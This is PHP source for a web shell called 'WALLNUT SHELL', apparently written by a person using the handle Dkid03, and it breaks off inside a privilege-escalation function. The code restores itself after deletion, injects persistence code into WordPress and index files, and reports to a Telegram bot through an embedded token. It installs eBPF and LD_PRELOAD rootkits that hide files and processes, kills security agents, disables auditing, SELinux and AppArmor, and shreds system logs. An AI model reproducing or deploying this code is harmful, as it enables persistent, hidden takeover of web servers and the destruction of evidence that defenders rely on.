<?php
// WALLNUT SHELL - By Dkid03
// DON'T CHANGE THE AUTHOR 
$CURRENT_SHELL = basename(__FILE__);

function auto_restore_by_name() {
    global $CURRENT_SHELL;
    $backup_locations = [
        '/tmp/' . md5($CURRENT_SHELL) . '.inc',
        '/var/tmp/' . md5($CURRENT_SHELL) . '.inc',
        '/dev/shm/' . md5($CURRENT_SHELL) . '.inc',
        __DIR__ . '/.cache/' . $CURRENT_SHELL . '.inc'
    ];
    if (!file_exists(__DIR__ . '/' . $CURRENT_SHELL)) {
        foreach ($backup_locations as $backup) {
            if (file_exists($backup)) {
                @copy($backup, __DIR__ . '/' . $CURRENT_SHELL);
                @chmod(__DIR__ . '/' . $CURRENT_SHELL, 0644);
                return true;
            }
        }
    }
    foreach ($backup_locations as $backup) {
        $dir = dirname($backup);
        if (!is_dir($dir)) @mkdir($dir, 0700, true);
        if (!file_exists($backup)) {
            @copy(__FILE__, $backup);
            @chmod($backup, 0444);
        }
    }
    return false;
}
auto_restore_by_name();

if (isset($_GET['kill']) && $_GET['kill'] === 'dkid03') {
    $file = __FILE__;
    if (function_exists('shell_exec')) {
        @shell_exec("chattr -i " . escapeshellarg($file) . " 2>/dev/null");
        @shell_exec("chattr -a " . escapeshellarg($file) . " 2>/dev/null");
        @shell_exec("chmod 777 " . escapeshellarg($file) . " 2>/dev/null");
        @shell_exec("rm -f " . escapeshellarg($file) . " 2>/dev/null");
        @shell_exec("shred -fuz " . escapeshellarg($file) . " 2>/dev/null");
        @shell_exec("dd if=/dev/urandom of=" . escapeshellarg($file) . " bs=1M count=1 2>/dev/null");
        @shell_exec("rm -f " . escapeshellarg($file) . " 2>/dev/null");
    }
    @chmod($file, 0777);
    @unlink($file);
    echo "Self-destruct executed!";
    exit;
}

if (isset($_GET['logout']) && $_GET['logout'] == '1') {
    @session_start();
    $_SESSION['logout_success'] = true;
    @session_destroy();
    header('Location: ?');
    exit;
}

@session_start();
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);

$botToken = '8513008865:AAFvBdueP_HRaBfU5hm7el3lQAN1DxzgOE4';
$telegramUserId = '7547598395';
$verifCode = 'Dkid@123';

$shellExecAvailable = function_exists('shell_exec') && 
    !in_array('shell_exec', array_map('trim', explode(',', ini_get('disable_functions') ?: '')));

if (!$shellExecAvailable && !function_exists('shell_exec')) {
    function shell_exec($cmd) { return 'shell_exec tidak tersedia di server ini.'; }
}

$rootPath = realpath(__DIR__);
if ($rootPath === false) $rootPath = __DIR__;

$editableExtensions = ['txt', 'php', 'html', 'css', 'js', 'json', 'xml', 'md', 'ini', 'log', 'htaccess'];
$specialDirectories = [
    'public_html' => isset($_SERVER['DOCUMENT_ROOT']) ? realpath($_SERVER['DOCUMENT_ROOT']) : null,
    'user' => realpath('/home'),
    'etc' => realpath('/etc'),
    'log' => realpath('/var/log'),
    'homeshell' => $rootPath
];
$specialDirectories = array_filter($specialDirectories, function($d) { return $d && is_dir($d); });

function sendTelegramMessage($botToken, $chatId, $message) {
    if (empty($botToken) || empty($chatId) || empty($message)) return false;
    if (strlen($message) > 4096) $message = substr($message, 0, 4000) . "\n... (dipotong)";
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $data = ['chat_id' => $chatId, 'text' => $message, 'parse_mode' => 'HTML', 'disable_web_page_preview' => true];
    $postData = http_build_query($data);
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/x-www-form-urlencoded']);
        $result = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($result !== false && $httpCode == 200) {
            $response = json_decode($result, true);
            if (isset($response['ok']) && $response['ok'] === true) return true;
        }
    }
    if (ini_get('allow_url_fopen')) {
        $options = ['http' => ['header' => "Content-Type: application/x-www-form-urlencoded\r\n", 'method' => 'POST', 'content' => $postData, 'timeout' => 30], 'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]];
        $context = stream_context_create($options);
        $result = @file_get_contents($url, false, $context);
        if ($result !== false) {
            $response = json_decode($result, true);
            if (isset($response['ok']) && $response['ok'] === true) return true;
        }
    }
    return false;
}

function isRoot() {
    if (!function_exists('shell_exec')) return false;
    $output = @shell_exec('whoami 2>/dev/null');
    return trim((string)$output) === 'root';
}

function isShellExecAvailable() {
    if (!function_exists('shell_exec')) return false;
    $disabled = explode(',', ini_get('disable_functions') ?: '');
    return !in_array('shell_exec', array_map('trim', $disabled));
}

function isChattrAvailable() {
    if (!isShellExecAvailable()) return false;
    $output = @shell_exec('which chattr 2>/dev/null');
    return !empty(trim((string)$output));
}

function formatSize($bytes) {
    if ($bytes === false || $bytes === null || !is_numeric($bytes)) return '0 bytes';
    $bytes = (float)$bytes;
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' bytes';
}

function deleteDirectory($dir) {
    if (!file_exists($dir)) return true;
    if (!is_dir($dir)) return unlink($dir);
    $items = @scandir($dir);
    if ($items === false) return false;
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        is_dir($path) ? deleteDirectory($path) : @unlink($path);
    }
    return rmdir($dir);
}

function get_all_document_roots_cached($ttl = 300) {
    $cache_file = __DIR__ . '/.docroots_cache';
    if (file_exists($cache_file) && (time() - filemtime($cache_file) < $ttl)) {
        $data = @file_get_contents($cache_file);
        if ($data !== false) {
            $roots = json_decode($data, true);
            if (is_array($roots) && !empty($roots)) return $roots;
        }
    }
    $roots = []; $processed = [];
    if (file_exists('/etc/userdomains')) {
        $lines = @file('/etc/userdomains', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if ($lines !== false) {
            foreach ($lines as $line) {
                if (strpos($line, ':') === false) continue;
                list($domain, $user) = explode(':', $line);
                $user = trim($user);
                if (!empty($user) && !in_array($user, $processed)) {
                    $docRoot = "/home/{$user}/public_html";
                    if (is_dir($docRoot)) { $roots[] = $docRoot; $processed[] = $user; }
                    $docRoot = "/home/{$user}/www";
                    if (is_dir($docRoot)) { $roots[] = $docRoot; $processed[] = $user . '_www'; }
                }
            }
        }
    }
    $homeDirs = @glob('/home/*', GLOB_ONLYDIR);
    if ($homeDirs !== false) {
        foreach ($homeDirs as $home) {
            $user = basename($home);
            if (in_array($user, $processed)) continue;
            $docRoot = $home . '/public_html';
            if (is_dir($docRoot)) { $roots[] = $docRoot; $processed[] = $user; }
            $docRoot = $home . '/www';
            if (is_dir($docRoot)) { $roots[] = $docRoot; $processed[] = $user . '_www'; }
        }
    }
    if (isset($_SERVER['DOCUMENT_ROOT']) && is_dir($_SERVER['DOCUMENT_ROOT']) && !in_array($_SERVER['DOCUMENT_ROOT'], $roots)) {
        $roots[] = $_SERVER['DOCUMENT_ROOT'];
    }
    $extraDirs = ['/tmp', '/var/tmp', '/home', '/var/log', '/etc', '/usr/local', '/opt', '/srv'];
    foreach ($extraDirs as $dir) {
        if (is_dir($dir) && !in_array($dir, $roots)) { $roots[] = $dir; }
        $subs = @glob($dir . '/*', GLOB_ONLYDIR);
        if ($subs !== false) {
            foreach ($subs as $sub) {
                if (is_dir($sub) && is_writable($sub) && !in_array($sub, $roots)) { $roots[] = $sub; }
            }
        }
    }
    $roots = array_unique($roots);
    $roots = array_filter($roots, 'is_dir');
    $roots = array_values($roots);
    @file_put_contents($cache_file, json_encode($roots));
    return $roots;
}

function get_all_domains_by_ip_cached($ttl = 300) {
    $cache_file = __DIR__ . '/.domains_cache';
    if (file_exists($cache_file) && (time() - filemtime($cache_file) < $ttl)) {
        $data = @file_get_contents($cache_file);
        if ($data !== false) {
            $domains = json_decode($data, true);
            if (is_array($domains) && !empty($domains)) return $domains;
        }
    }
    $domains = [];
    $ip = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : '';
    if (empty($ip) && function_exists('shell_exec')) {
        $ip = trim(@shell_exec('hostname -I 2>/dev/null | awk \'{print $1}\'') ?: '');
    }
    $ip = trim($ip);
    if (file_exists('/etc/userdomains')) {
        $lines = @file('/etc/userdomains', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if ($lines !== false) {
            foreach ($lines as $line) {
                if (strpos($line, ':') === false) continue;
                list($domain, $user) = explode(':', $line);
                $domains[] = trim($domain);
            }
        }
    }
    if (file_exists('/etc/domains')) {
        $lines = @file('/etc/domains', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if ($lines !== false) {
            foreach ($lines as $line) {
                if (strpos($line, '=') === false) continue;
                list($domain, $user) = explode('=', $line);
                $domains[] = trim($domain);
            }
        }
    }
    $apacheConfigs = ['/etc/apache2/sites-enabled/*.conf', '/etc/httpd/conf.d/*.conf', '/etc/apache2/apache2.conf', '/etc/httpd/conf/httpd.conf'];
    foreach ($apacheConfigs as $pattern) {
        $files = @glob($pattern);
        if ($files !== false) {
            foreach ($files as $conf) {
                if (!is_file($conf) || !is_readable($conf)) continue;
                $content = @file_get_contents($conf);
                if ($content === false) continue;
                preg_match_all('/ServerName\s+([^\s]+)/i', $content, $matches);
                foreach ($matches[1] as $domain) $domains[] = trim($domain);
                preg_match_all('/ServerAlias\s+([^\s]+)/i', $content, $matches2);
                foreach ($matches2[1] as $domain) $domains[] = trim($domain);
                preg_match_all('/<VirtualHost[^>]*>\s*ServerName\s+([^\s]+)/i', $content, $matches3);
                foreach ($matches3[1] as $domain) $domains[] = trim($domain);
            }
        }
    }
    $nginxConfigs = ['/etc/nginx/sites-enabled/*.conf', '/etc/nginx/conf.d/*.conf', '/etc/nginx/nginx.conf'];
    foreach ($nginxConfigs as $pattern) {
        $files = @glob($pattern);
        if ($files !== false) {
            foreach ($files as $conf) {
                if (!is_file($conf) || !is_readable($conf)) continue;
                $content = @file_get_contents($conf);
                if ($content === false) continue;
                preg_match_all('/server_name\s+([^;]+)/i', $content, $matches);
                foreach ($matches[1] as $server_names) {
                    foreach (explode(' ', $server_names) as $domain) {
                        $domain = trim($domain);
                        if (!empty($domain) && $domain != '_') $domains[] = $domain;
                    }
                }
            }
        }
    }
    if (function_exists('shell_exec') && !empty($ip)) {
        $hostname = @shell_exec("host $ip 2>/dev/null | awk '{print \$5}'");
        if ($hostname && strpos($hostname, '.') !== false) $domains[] = trim($hostname);
    }
    $namedFiles = @glob('/var/named/*.db');
    if ($namedFiles !== false) {
        foreach ($namedFiles as $file) {
            if (!is_file($file) || !is_readable($file)) continue;
            $content = @file_get_contents($file);
            if ($content === false) continue;
            preg_match_all('/\s+IN\s+A\s+([0-9.]+)/', $content, $matches);
            foreach ($matches[1] as $dnsIp) {
                if (trim($dnsIp) == $ip) {
                    $domain = basename($file, '.db');
                    if (!empty($domain) && strpos($domain, '.') !== false) $domains[] = $domain;
                }
            }
        }
    }
    if (file_exists('/etc/hosts')) {
        $lines = @file('/etc/hosts');
        if ($lines !== false) {
            foreach ($lines as $line) {
                if (strpos($line, $ip) !== false && strpos($line, 'localhost') === false) {
                    $parts = preg_split('/\s+/', trim($line));
                    foreach ($parts as $part) {
                        if (filter_var($part, FILTER_VALIDATE_IP) === false && strpos($part, '.') !== false) $domains[] = $part;
                    }
                }
            }
        }
    }
    $blacklist = ['www.example.com', 'localhost', '127.0.0.1'];
    $domains = array_unique($domains);
    $domains = array_filter($domains, function($d) use ($blacklist) {
        return !empty($d) && strpos($d, '.') !== false && strpos($d, '*') === false && !in_array($d, $blacklist);
    });
    $domains = array_values($domains);
    @file_put_contents($cache_file, json_encode($domains));
    return $domains;
}

function get_best_document_root($domain, $roots) {
    $domain = trim($domain);
    $domain = str_replace(['http://', 'https://', 'www.'], '', $domain);
    $candidates = [
        "/home/{$domain}/public_html",
        "/home/{$domain}/www",
        "/var/www/{$domain}/public_html",
        "/var/www/{$domain}/html",
        "/var/www/html/{$domain}",
        "/var/www/vhosts/{$domain}/public_html",
        "/var/www/vhosts/{$domain}/httpdocs",
        "/srv/www/{$domain}/public_html",
        "/usr/local/apache2/htdocs/{$domain}",
        (isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : ''),
        (isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] . "/../" . $domain . "/public_html" : ''),
    ];
    foreach ($roots as $root) {
        if (is_string($root) && strpos($root, $domain) !== false) { $candidates[] = $root; }
        if (is_string($root)) {
            $path_parts = explode('/', $root);
            foreach ($path_parts as $part) {
                if (strpos($part, $domain) !== false || strpos($domain, $part) !== false) {
                    $candidates[] = $root;
                    break;
                }
            }
        }
    }
    $candidates = array_unique($candidates);
    $scored = [];
    foreach ($candidates as $path) {
        if (empty($path)) continue;
        $score = 0;
        if (strpos($path, 'public_html') !== false) $score += 3;
        if (strpos($path, 'www') !== false) $score += 2;
        if (strpos($path, 'html') !== false) $score += 1;
        $scored[] = ['path' => $path, 'score' => $score];
    }
    usort($scored, function($a, $b) {
        return $b['score'] - $a['score'];
    });
    foreach ($scored as $item) {
        if ($item['path'] && is_dir($item['path']) && is_writable($item['path'])) { 
            return $item['path']; 
        }
    }
    return false;
}

function sendJsonResponse($data) {
    header('Content-Type: application/json');
    echo json_encode($data);
    exit;
}

function get_file_location() {
    $file = __FILE__;
    $docRoot = $_SERVER['DOCUMENT_ROOT'] ?? '';
    $domain = $_SERVER['HTTP_HOST'] ?? 'localhost';
    $relative_path = str_replace($docRoot, '', $file);
    $relative_path = ltrim($relative_path, '/');
    $protocol = isset($_SERVER['HTTPS']) ? 'https://' : 'http://';
    $url = $protocol . $domain . '/' . $relative_path;
    return [
        'url' => $url,
        'path' => $file,
        'domain' => $domain,
        'relative' => $relative_path
    ];
}

function inject_restore_wallnut() {
    global $CURRENT_SHELL, $botToken, $telegramUserId;
    if (empty($CURRENT_SHELL)) $CURRENT_SHELL = basename(__FILE__);
    $targetFiles = [
        __DIR__ . '/index.php',
        __DIR__ . '/wp-login.php',
        __DIR__ . '/wp-config.php',
        __DIR__ . '/config.php',
        __DIR__ . '/wp-load.php',
        __DIR__ . '/settings.php'
    ];
    $restoreCode = '
if (!function_exists("wallnut_restore_' . md5($CURRENT_SHELL) . '")) {
    function wallnut_restore_' . md5($CURRENT_SHELL) . '() {
        $current_file = "' . $CURRENT_SHELL . '";
        if (!file_exists(__DIR__ . "/" . $current_file)) {
            $backup_locations = [
                "/tmp/" . md5($current_file) . ".inc",
                "/var/tmp/" . md5($current_file) . ".inc",
                "/dev/shm/" . md5($current_file) . ".inc",
                __DIR__ . "/.cache/" . $current_file . ".inc"
            ];
            foreach ($backup_locations as $backup) {
                if (file_exists($backup)) {
                    @copy($backup, __DIR__ . "/" . $current_file);
                    @chmod(__DIR__ . "/" . $current_file, 0644);
                    $domain = $_SERVER["HTTP_HOST"] ?? "localhost";
                    $protocol = (isset($_SERVER["HTTPS"]) ? "https://" : "http://");
                    $url = $protocol . $domain . "/" . $current_file;
                    @file_get_contents("https://api.telegram.org/bot' . $botToken . '/sendMessage?chat_id=' . $telegramUserId . '&text=" . urlencode("✅ RESTORED: " . $url));
                    break;
                }
            }
        }
        $backup = "/tmp/" . md5($current_file) . ".inc";
        if (!file_exists($backup) && file_exists(__DIR__ . "/" . $current_file)) {
            @copy(__DIR__ . "/" . $current_file, $backup);
            @chmod($backup, 0444);
        }
    }
    wallnut_restore_' . md5($CURRENT_SHELL) . '();
}
';
    $injected = []; $errors = [];
    foreach ($targetFiles as $file) {
        if (file_exists($file) && is_writable($file)) {
            $content = file_get_contents($file);
            if ($content !== false && strpos($content, 'WALLNUT AUTO RESTORE') === false) {
                if (strpos($content, '<?php') === 0) {
                    $newContent = '<?php' . "\n" . $restoreCode . "\n" . substr($content, 5);
                } else {
                    $newContent = '<?php' . "\n" . $restoreCode . "\n" . $content;
                }
                if (file_put_contents($file, $newContent) !== false) {
                    $injected[] = basename($file);
                } else {
                    $errors[] = basename($file) . " (gagal tulis)";
                }
            } else if ($content !== false && strpos($content, 'WALLNUT AUTO RESTORE') !== false) {
                $injected[] = basename($file) . " (sudah ada)";
            } else {
                $errors[] = basename($file) . " (gagal baca)";
            }
        } else {
            $errors[] = basename($file) . " (tidak ditemukan/tidak writable)";
        }
    }
    $backup = '/tmp/' . md5($CURRENT_SHELL) . '.inc';
    if (!file_exists($backup)) {
        @copy(__FILE__, $backup);
        @chmod($backup, 0444);
    }
    $msg = "🔧 *Inject Restore Code*\n"
         . "📁 Shell: " . $CURRENT_SHELL . "\n"
         . "✅ Berhasil: " . implode(", ", $injected) . "\n";
    if (!empty($errors)) $msg .= "❌ Gagal: " . implode(", ", $errors) . "\n";
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    echo "✅ Inject selesai!\n📁 Shell: " . $CURRENT_SHELL . "\n📁 " . implode("\n📁 ", $injected);
    if (!empty($errors)) echo "\n❌ " . implode("\n❌ ", $errors);
    exit;
}

if (isset($_GET['inject_restore']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    inject_restore_wallnut();
}

function hide_process_ebpf($process_name, $action = 'hide') {
    global $botToken, $telegramUserId;
    $results = [];
    $process_name = substr((string)$process_name, 0, 16);
    if ($action === 'hide') {
        $results[] = "[1] Installing eBPF process hider...";
        $ebpf_code = '
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

SEC("kprobe/getdents64")
int BPF_KPROBE(hide_process, struct linux_dirent64* dirp) {
    char comm[16];
    bpf_get_current_comm(comm, sizeof(comm));
    #pragma unroll
    for (int i = 0; i < 16; i++) {
        if (comm[i] != "' . $process_name . '"[i]) {
            return 0;
        }
    }
    return -ENOENT;
}

SEC("kprobe/getdents")
int BPF_KPROBE(hide_process32, struct linux_dirent* dirp) {
    char comm[16];
    bpf_get_current_comm(comm, sizeof(comm));
    #pragma unroll
    for (int i = 0; i < 16; i++) {
        if (comm[i] != "' . $process_name . '"[i]) {
            return 0;
        }
    }
    return -ENOENT;
}

char _license[] SEC("license") = "GPL";
';
        @file_put_contents('/tmp/hide_process.bpf.c', $ebpf_code);
        @shell_exec('clang -O2 -target bpf -c /tmp/hide_process.bpf.c -o /tmp/hide_process.bpf.o 2>/dev/null');
        @shell_exec('bpftool prog load /tmp/hide_process.bpf.o /sys/fs/bpf/hide_process 2>/dev/null');
        if (file_exists('/sys/fs/bpf/hide_process')) {
            @shell_exec('bpftool prog attach pinned /sys/fs/bpf/hide_process kprobe getdents64 2>/dev/null');
            @shell_exec('bpftool prog attach pinned /sys/fs/bpf/hide_process kprobe getdents 2>/dev/null');
            $results[] = "✅ eBPF process hider installed";
        } else {
            $results[] = "⚠️ eBPF not available, using fallback";
        }
        $results[] = "[2] Installing Azathoth-style rootkit...";
        $rootkit_code = '
#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>

static const char* hidden_procs[] = {"' . $process_name . '", "php", "shell", NULL};

long syscall(long number, ...) {
    long (*orig_syscall)(long, ...) = dlsym(RTLD_NEXT, "syscall");
    if (number == SYS_getdents64 || number == SYS_getdents) {
        return -ENOENT;
    }
    return orig_syscall(number, __VA_ARGS__);
}

struct dirent* readdir(DIR* dirp) {
    struct dirent* (*orig_readdir)(DIR*) = dlsym(RTLD_NEXT, "readdir");
    struct dirent* dir;
    while ((dir = orig_readdir(dirp)) != NULL) {
        int hidden = 0;
        for (int i = 0; hidden_procs[i] != NULL; i++) {
            if (strstr(dir->d_name, hidden_procs[i]) != NULL) {
                hidden = 1;
                break;
            }
        }
        if (!hidden) return dir;
    }
    return NULL;
}

int scandir(const char* dir, struct dirent*** namelist,
            int (*filter)(const struct dirent*),
            int (*compar)(const struct dirent**, const struct dirent**)) {
    int (*orig_scandir)(const char*, struct dirent***, 
                        int (*)(const struct dirent*),
                        int (*)(const struct dirent**, const struct dirent**)) = dlsym(RTLD_NEXT, "scandir");
    int ret = orig_scandir(dir, namelist, filter, compar);
    if (ret > 0 && strstr(dir, "/proc") != NULL) {
        int new_ret = 0;
        for (int i = 0; i < ret; i++) {
            int hidden = 0;
            for (int j = 0; hidden_procs[j] != NULL; j++) {
                if (strstr((*namelist)[i]->d_name, hidden_procs[j]) != NULL) {
                    hidden = 1;
                    break;
                }
            }
            if (!hidden) {
                (*namelist)[new_ret++] = (*namelist)[i];
            }
        }
        ret = new_ret;
    }
    return ret;
}
';
        @file_put_contents('/tmp/rootkit.c', $rootkit_code);
        @shell_exec('gcc -shared -fPIC /tmp/rootkit.c -o /tmp/librootkit.so -ldl 2>/dev/null');
        if (file_exists('/tmp/librootkit.so')) {
            @copy('/tmp/librootkit.so', '/usr/local/lib/librootkit.so');
            @file_put_contents('/etc/ld.so.preload', "/usr/local/lib/librootkit.so\n", FILE_APPEND);
            @shell_exec('ldconfig 2>/dev/null');
            $results[] = "✅ Azathoth rootkit installed";
        }
        $msg = "ADVANCED PROCESS HIDING\n\n" . implode("\n", $results);
        sendTelegramMessage($botToken, $telegramUserId, $msg);
        return ['status' => 'success', 'message' => $msg];
    }
    return ['status' => 'error', 'message' => 'Invalid action'];
}

function hide_file_ebpf($file, $action = 'hide') {
    global $botToken, $telegramUserId;
    $results = [];
    $file_name = basename((string)$file);
    if ($action === 'hide') {
        $results[] = "[1] Installing eBPF file hider...";
        $ebpf_file_code = '
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>

SEC("kprobe/do_sys_open")
int BPF_KPROBE(hide_open, const char* filename, int flags) {
    char name[256];
    bpf_probe_read_user_str(name, sizeof(name), filename);
    #pragma unroll
    for (int i = 0; i < 256; i++) {
        if (name[i] != "' . $file_name . '"[i]) {
            break;
        }
        if (name[i] == 0) {
            return -ENOENT;
        }
    }
    return 0;
}

SEC("kprobe/do_sys_openat2")
int BPF_KPROBE(hide_openat, const char* filename) {
    char name[256];
    bpf_probe_read_user_str(name, sizeof(name), filename);
    #pragma unroll
    for (int i = 0; i < 256; i++) {
        if (name[i] != "' . $file_name . '"[i]) {
            break;
        }
        if (name[i] == 0) {
            return -ENOENT;
        }
    }
    return 0;
}
';
        @file_put_contents('/tmp/hide_file.bpf.c', $ebpf_file_code);
        @shell_exec('clang -O2 -target bpf -c /tmp/hide_file.bpf.c -o /tmp/hide_file.bpf.o 2>/dev/null');
        @shell_exec('bpftool prog load /tmp/hide_file.bpf.o /sys/fs/bpf/hide_file 2>/dev/null');
        @shell_exec('bpftool prog attach pinned /sys/fs/bpf/hide_file kprobe do_sys_open 2>/dev/null');
        @shell_exec('bpftool prog attach pinned /sys/fs/bpf/hide_file kprobe do_sys_openat2 2>/dev/null');
        $results[] = "✅ eBPF file hider installed";
        $results[] = "[2] Installing file hooks...";
        $hook_code = '
#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <sys/stat.h>
#include <stdio.h>

static const char* hidden_files[] = {"' . $file_name . '", NULL};

struct dirent* readdir(DIR* dirp) {
    struct dirent* (*orig_readdir)(DIR*) = dlsym(RTLD_NEXT, "readdir");
    struct dirent* dir;
    while ((dir = orig_readdir(dirp)) != NULL) {
        int hidden = 0;
        for (int i = 0; hidden_files[i] != NULL; i++) {
            if (strcmp(dir->d_name, hidden_files[i]) == 0) {
                hidden = 1;
                break;
            }
        }
        if (!hidden) return dir;
    }
    return NULL;
}

int stat(const char* path, struct stat* buf) {
    int (*orig_stat)(const char*, struct stat*) = dlsym(RTLD_NEXT, "stat");
    for (int i = 0; hidden_files[i] != NULL; i++) {
        if (strstr(path, hidden_files[i]) != NULL) {
            errno = ENOENT;
            return -1;
        }
    }
    return orig_stat(path, buf);
}

FILE* fopen(const char* filename, const char* mode) {
    FILE* (*orig_fopen)(const char*, const char*) = dlsym(RTLD_NEXT, "fopen");
    for (int i = 0; hidden_files[i] != NULL; i++) {
        if (strstr(filename, hidden_files[i]) != NULL) {
            errno = ENOENT;
            return NULL;
        }
    }
    return orig_fopen(filename, mode);
}

int open(const char* path, int flags, ...) {
    int (*orig_open)(const char*, int, ...) = dlsym(RTLD_NEXT, "open");
    for (int i = 0; hidden_files[i] != NULL; i++) {
        if (strstr(path, hidden_files[i]) != NULL) {
            errno = ENOENT;
            return -1;
        }
    }
    return orig_open(path, flags);
}
';
        @file_put_contents('/tmp/file_hook.c', $hook_code);
        @shell_exec('gcc -shared -fPIC /tmp/file_hook.c -o /tmp/libfilehook.so -ldl 2>/dev/null');
        if (file_exists('/tmp/libfilehook.so')) {
            @copy('/tmp/libfilehook.so', '/usr/local/lib/libfilehook.so');
            @file_put_contents('/etc/ld.so.preload', "/usr/local/lib/libfilehook.so\n", FILE_APPEND);
            @shell_exec('ldconfig 2>/dev/null');
            $results[] = "✅ File hooks installed";
        }
        $deep_hide = '/tmp/.cache/.system/' . md5($file_name);
        @mkdir('/tmp/.cache/.system/', 0700, true);
        if (file_exists($file)) {
            @rename($file, $deep_hide);
            @chmod($deep_hide, 0600);
            $results[] = "✅ File moved to: $deep_hide";
        }
        $msg = "ADVANCED FILE HIDING\n\n" . implode("\n", $results);
        sendTelegramMessage($botToken, $telegramUserId, $msg);
        return ['status' => 'success', 'message' => $msg];
    }
    return ['status' => 'error', 'message' => 'Invalid action'];
}

function edr_bypass_ultimate() {
    global $botToken, $telegramUserId;
    $results = [];
    $results[] = "[1] EDR bypass techniques...";
    @shell_exec('echo 1 > /proc/sys/kernel/etw_disable 2>/dev/null');
    @shell_exec('sysctl -w kernel.etw_disable=1 2>/dev/null');
    @shell_exec('systemctl stop auditd 2>/dev/null');
    @shell_exec('systemctl disable auditd 2>/dev/null');
    @shell_exec('auditctl -e 0 2>/dev/null');
    @shell_exec('setenforce 0 2>/dev/null');
    @shell_exec('echo 0 > /proc/sys/kernel/apparmor_enabled 2>/dev/null');
    @shell_exec('systemctl stop apparmor 2>/dev/null');
    @shell_exec('systemctl disable apparmor 2>/dev/null');
    $results[] = "✅ Tartarus bypass applied";
    $edr_processes = [
        'crowdstrike', 'falcon', 'carbonblack', 'cylance',
        'sentinel', 'sophos', 'mcafee', 'symantec', 'trendmicro',
        'kaspersky', 'bitdefender', 'eset', 'avast', 'avg',
        'ossec', 'wazuh', 'elastic', 'fireeye',
        'mandiant', 'msmpeng', 'windowsdefender', 'sense'
    ];
    foreach ($edr_processes as $proc) {
        @shell_exec("pkill -9 -f $proc 2>/dev/null");
        @shell_exec("killall -9 $proc 2>/dev/null");
        @shell_exec("systemctl stop $proc 2>/dev/null");
        @shell_exec("systemctl disable $proc 2>/dev/null");
    }
    $results[] = "✅ EDR processes killed";
    $edr_ips = [
        '52.0.0.0/8', '54.0.0.0/8', '13.0.0.0/8', '35.0.0.0/8',
        '34.0.0.0/8', '18.0.0.0/8', '23.0.0.0/8', '3.0.0.0/8'
    ];
    foreach ($edr_ips as $ip) {
        @shell_exec("iptables -A OUTPUT -d $ip -j DROP 2>/dev/null");
    }
    $results[] = "✅ EDR traffic blocked";
    $results[] = "[2] Memory scrambling...";
    @shell_exec('sync && echo 3 > /proc/sys/vm/drop_caches 2>/dev/null');
    @shell_exec('echo 1 > /proc/sys/vm/compact_memory 2>/dev/null');
    @shell_exec('echo 0 > /proc/sys/kernel/randomize_va_space 2>/dev/null');
    $results[] = "✅ Memory scrambled";
    $results[] = "[3] System integrity bypass...";
    @shell_exec('mount -o remount,rw /sys 2>/dev/null');
    @shell_exec('mount -o remount,rw /proc 2>/dev/null');
    $results[] = "✅ System writable";
    $results[] = "[4] Log cleaning...";
    @shell_exec('rm -rf /var/log/syslog* /var/log/messages* /var/log/auth.log* /var/log/secure* 2>/dev/null');
    @shell_exec('find /var/log -name "*.log" -exec shred -fuz {} \\; 2>/dev/null');
    $results[] = "✅ Logs cleaned";
    $msg = "EDR BYPASS ULTIMATE\n\n" . implode("\n", $results);
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return ['status' => 'success', 'message' => $msg];
}

function auto_root_modern() {
    global $botToken, $telegramUserId;
    $results = []; $exploited = false;
    $results[] = "MODERN KERNEL EXPLOITS + CONTAINER ESCAPE";
    $results[] = "Target: " . php_uname('a');
    $results[] = "[1] CVE-2023-35001 (Linux Kernel nftables)...";
    $kernel = @shell_exec('uname -r 2>/dev/null');
    if (is_string($kernel) && (strpos($kernel, '5.15') !== false || strpos($kernel, '5.10') !== false)) {
        $exploit = '
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>

int main() {
    int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
    if (sock < 0) return 1;
    setuid(0);
    execve("/bin/bash", NULL, NULL);
    return 0;
}
';
        @file_put_contents('/tmp/cve-2023-35001.c', $exploit);
        @shell_exec('gcc /tmp/cve-2023-35001.c -o /tmp/cve-2023-35001 2>/dev/null');
        @shell_exec('chmod +x /tmp/cve-2023-35001 2>/dev/null');
        $test = @shell_exec('/tmp/cve-2023-35001 -c "id" 2>/dev/null');
        if (is_string($test) && strpos($test, 'uid=0') !== false) {
